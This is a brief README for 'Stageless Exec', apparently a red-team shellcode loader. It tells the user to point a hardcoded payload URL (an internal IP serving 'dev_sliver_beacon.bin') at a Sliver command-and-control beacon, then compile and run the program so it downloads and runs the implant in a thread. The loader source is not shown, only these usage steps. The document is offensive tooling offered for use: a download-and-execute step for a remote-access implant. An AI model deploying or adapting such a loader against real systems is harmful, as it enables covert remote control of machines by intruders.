# Stageless Exec

### Usage

- Change the URL of the payload endpoint on line 7 `#define PAYLOAD	L"http://10.4.10.20:8080/dev_sliver_beacon.bin"`
- Make sure you have a sliver shellcode named correctly being served from that endpoint.
- Compile a Release build and run. The program will freeze as it waits on the thread running the sliver implant infinitely.

